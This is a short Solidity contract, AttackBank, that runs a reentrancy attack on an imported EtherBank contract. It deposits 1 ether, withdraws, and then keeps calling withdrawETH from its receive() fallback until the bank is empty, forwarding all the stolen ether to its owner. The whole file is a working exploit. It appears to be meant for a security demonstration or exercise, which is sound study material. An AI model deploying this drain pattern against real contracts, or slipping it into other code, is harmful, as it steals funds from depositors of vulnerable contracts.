// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {EtherBank} from "./EtherBank.sol";

contract AttackBank {
    EtherBank etherBank;
    address owner;

    constructor(address _etherBank) payable {
        etherBank = EtherBank(_etherBank);
        owner = msg.sender;
    }

    function attack() external {
        require(msg.sender == owner, "Only Owner");
        etherBank.depositETH{value: 1 ether}();
        etherBank.withdrawETH();
    }

    receive() external payable {
        uint256 etherBankBalance = address(etherBank).balance;
        if (etherBankBalance == 0) {
            (bool sent,) = owner.call{value: address(this).balance}("");
            require(sent, "Transfer to owner failed!");
        } else {
            etherBank.withdrawETH();
        }
    }
}
